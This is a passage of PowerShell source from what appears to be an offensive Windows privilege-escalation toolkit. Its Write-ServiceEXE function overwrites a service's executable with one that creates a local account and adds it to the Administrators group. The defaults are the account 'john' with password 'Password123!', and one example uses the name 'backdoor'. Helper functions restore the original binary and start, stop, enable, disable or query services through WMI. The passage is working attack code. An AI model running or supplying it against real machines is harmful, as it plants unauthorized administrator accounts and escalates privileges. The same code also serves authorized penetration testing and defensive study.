        Write-Verbose "Service binary written out to '$Path'"
        $true
    }
    catch {
        Write-Warning "Error while writing to location '$Path': $_"
        $false
    }
}


function Write-ServiceEXE {
    <#
    .SYNOPSIS
    Replaces a target service binary with a binary that invokes
    a powershell script that adds a user.

    .DESCRIPTION
    This function users Invoke-WriteServicePSBinary to write a service
    binary and powershell snippet out that creates a local user and
    adds them to specified local group.

    .PARAMETER ServiceName
    The service name to manipulate. Required.

    .PARAMETER UserName
    The username to add. If not given, it defaults to "john"

    .PARAMETER Password
    The password to set for the added user. If not given, it defaults to "Password123!"

    .PARAMETER GroupName
    Group to add the user to (default of Administrators)
        
    .OUTPUTS
    System.bool. True if the add succeeded, false otherwise.

    .EXAMPLE
    > Write-ServiceEXE -ServiceName VulnSVC
    Replaces the binary for service 'VulnSVC' with one that adds 
    a localuser "john" with password "Password123! to the machine 
    and local administrator group

    .EXAMPLE
    > Write-ServiceEXE -ServiceName VulnSVC -UserName backdoor -Password password -GroupName "Power Users"
    Replaces the binary for service 'VulnSVC' with one that adds a 
    localuser "backdoor" with password "password" to the machine 
    and local "Power Users" group
    #>

    [CmdletBinding()]
    Param (
        [Parameter(Mandatory = $True)] [string]$ServiceName,
        [string]$UserName = "john",
        [string]$Password = "Password123!",
        [string]$GroupName = "Administrators"
    )

    # query WMI for the service
    $TargetService = gwmi win32_service -Filter "Name='$ServiceName'"

    # make sure we got a result back
    if ($TargetService){
        try{

            $ServicePath = $TargetService.PathName
            $BackupPath = $ServicePath + ".bak"

            Write-Verbose "Backing up '$ServicePath' to '$BackupPath'"
            Copy-Item $ServicePath $BackupPath

            # write the proper service binary to the target path
            Write-UserAddServiceBinary -ServiceName $ServiceName -UserName $UserName -Password $Password -GroupName $GroupName -Path $ServicePath
        }
        catch{
            Write-Warning "Error: $_"
            $False
        }
    }

    else{
        Write-Warning "Target service '$ServiceName' not found on the machine"
        $False
    }

}


function Restore-ServiceEXE {
    <#
    .SYNOPSIS
    Restores the backup binary to the service path for a service.

    .DESCRIPTION
    This function copies in the backup executable to the original 
    binary path for a servie.

    .PARAMETER ServiceName
    The service name to manipulate. Required.
  
    .PARAMETER BackupPath
    Optional manual path to the backup binary.
        
    .OUTPUTS
    System.bool. True if the restore succeeded, false otherwise.

    .EXAMPLE
    > Restore-ServiceEXE -ServiceName VulnSVC
    Restore the original binary for the service 'VulnSVC'
    #>

    [CmdletBinding()]
    Param (
        [Parameter(Mandatory = $True)] [string]$ServiceName,
        [string]$BackupPath
    )

    # query WMI for the service
    $TargetService = gwmi win32_service -Filter "Name='$ServiceName'"

    # make sure we got a result back
    if ($TargetService){
        try{

            $ServicePath = $TargetService.PathName
            
            if ($BackupPath -eq $null){
                $BackupPath = $ServicePath + ".bak"
            }

            Write-Verbose "Restoring up '$BackupPath' to '$ServicePath'"
            Copy-Item $BackupPath $ServicePath

            Write-Verbose "Removing backup binary '$BackupPath'"
            Remove-Item $BackupPath
            
            $true
        }
        catch{
            Write-Warning "Error: $_"
            $false
        }
    }
    else{
        Write-Warning "Target service '$ServiceName' not found on the machine"
        $false
    }
}


function Invoke-ServiceStart {
    <#
    .SYNOPSIS
    Starts a specified service.

    .DESCRIPTION
    This function starts a specified service, first enabling the service
    if it was marked as disabled.

    .PARAMETER ServiceName
    The service name to start. Required.
        
    .OUTPUTS
    System.bool. True if the start succeeded, false otherwise.

    .EXAMPLE
    > Invoke-ServiceStart -ServiceName VulnSVC
    Start the 'VulnSVC' service.
    #>

    [CmdletBinding()]
    Param (
        [Parameter(Mandatory = $True)] [string]$ServiceName
    )

    # query WMI for the service
    $TargetService = gwmi win32_service -Filter "Name='$ServiceName'"

    # make sure we got a result back
    if ($TargetService){
        try{

            # enable the service if it was marked as disabled
            if ($TargetService.StartMode -eq "Disabled"){
                Write-Verbose "Service '$ServiceName' disabled, enabling..."
                $TargetService | Invoke-WmiMethod -Name ChangeStartMode -ArgumentList @("Manual") | Out-Null
            }

            # start the service up
            Write-Verbose "Starting service '$ServiceName'"
            $TargetService | Invoke-WmiMethod -Name StartService | Out-Null

            $true
        }
        catch{
            Write-Warning "Error: $_"
            $false
        }
    }

    else{
        Write-Warning "Target service '$ServiceName' not found on the machine"
        $false
    }
}


function Invoke-ServiceStop {
    <#
    .SYNOPSIS
    Stops a specified service.

    .DESCRIPTION
    This function stops a specified service.

    .PARAMETER ServiceName
    The service name to stop. Required.
        
    .OUTPUTS
    System.bool. True if the stop succeeded, false otherwise.

    .EXAMPLE
    > Invoke-ServiceStop -ServiceName VulnSVC
    Stop the 'VulnSVC' service.
    #>

    [CmdletBinding()]
    Param (
        [Parameter(Mandatory = $True)] [string]$ServiceName
    )

    # query WMI for the service
    $TargetService = gwmi win32_service -Filter "Name='$ServiceName'"

    # make sure we got a result back
    if ($TargetService){
        try{

            # stop the service
            Write-Verbose "Stopping service '$ServiceName'"
            $TargetService | Invoke-WmiMethod -Name StopService | Out-Null

            $true
        }
        catch{
            Write-Warning "Error: $_"
            $false
        }
    }
    else{
        Write-Warning "Target service '$ServiceName' not found on the machine"
        $false
    }
}


function Invoke-ServiceEnable {
    <#
    .SYNOPSIS
    Enables a specified service.

    .DESCRIPTION
    This function enables a specified service.

    .PARAMETER ServiceName
    The service name to enable. Required.
        
    .OUTPUTS
    System.bool. True if the enable succeeded, false otherwise.

    .EXAMPLE
    > Invoke-ServiceEnable -ServiceName VulnSVC
    Enables the 'VulnSVC' service.
    #>

    [CmdletBinding()]
    Param (
        [Parameter(Mandatory = $True)] [string]$ServiceName
    )

    # query WMI for the service
    $TargetService = gwmi win32_service -Filter "Name='$ServiceName'"

    # make sure we got a result back
    if ($TargetService){
        try{

            # enable the service
            Write-Verbose "Enabling service '$ServiceName'"
            $TargetService | Invoke-WmiMethod -Name ChangeStartMode -ArgumentList @("Manual") | Out-Null

            $true
        }
        catch{
            Write-Warning "Error: $_"
            $false
        }
    }
    else{
        Write-Warning "Target service '$ServiceName' not found on the machine"
        $false
    }
}


function Invoke-ServiceDisable {
    <#
    .SYNOPSIS
    Disables a specified service.

    .DESCRIPTION
    This function disables a specified service.

    .PARAMETER ServiceName
    The service name to disable. Required.
        
    .OUTPUTS
    System.bool. True if the disable succeeded, false otherwise.

    .EXAMPLE
    > Invoke-ServiceDisable -ServiceName VulnSVC
    Disables the 'VulnSVC' service.
    #>

    [CmdletBinding()]
    Param (
        [Parameter(Mandatory = $True)] [string]$ServiceName
    )

    # query WMI for the service
    $TargetService = gwmi win32_service -Filter "Name='$ServiceName'"

    # make sure we got a result back
    if ($TargetService){
        try{

            # disable the service
            Write-Verbose "Disabling service '$ServiceName'"
            $TargetService | Invoke-WmiMethod -Name ChangeStartMode -ArgumentList @("Disabled") | Out-Null

            $true
        }
        catch{
            Write-Warning "Error: $_"
            $false
        }
    }
    else{
        Write-Warning "Target service '$ServiceName' not found on the machine"
        $false
    }
}


function Get-ServiceDetails {
    <#
    .SYNOPSIS
    Gets detailed information about a service.

    .DESCRIPTION
    This function returns detailed information about a service.

    .PARAMETER ServiceName
    The service name to query for. Required.
    
    .OUTPUTS
    System.Array. Object array of service details if service is found,
    $null if the service is not found.

    .EXAMPLE
    > Get-ServiceDetails -ServiceName VulnSVC
    Gets detailed information about the 'VulnSVC' service.
    #>

    [CmdletBinding()]
    Param (
        [Parameter(Mandatory = $True)] [string]$ServiceName
    )

    # query WMI for the service
    $TargetService = gwmi win32_service -Filter "Name='$ServiceName'"

    # make sure we got a result back
    if ($TargetService){
        try{
            $TargetService | Format-List *
        }
        catch{
            Write-Warning "Error: $_"
            $null
        }
    }
    else{
        Write-Warning "Target service '$ServiceName' not found on the machine"
        $null
    }
}

